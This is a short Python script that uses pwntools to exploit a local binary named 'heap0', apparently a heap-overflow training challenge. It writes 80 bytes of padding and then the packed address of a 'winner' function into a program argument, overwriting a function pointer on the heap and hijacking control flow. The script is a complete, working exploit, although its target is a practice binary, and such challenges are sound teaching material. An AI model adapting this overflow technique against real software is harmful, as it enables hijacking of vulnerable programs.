#!/usr/bin/python
from pwn import *

winner = 0x80484b6
payload = "0000111122223333444455556666777788889999aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj"
payload += p32(winner)
s = process(["./heap0", payload])
s.interactive()
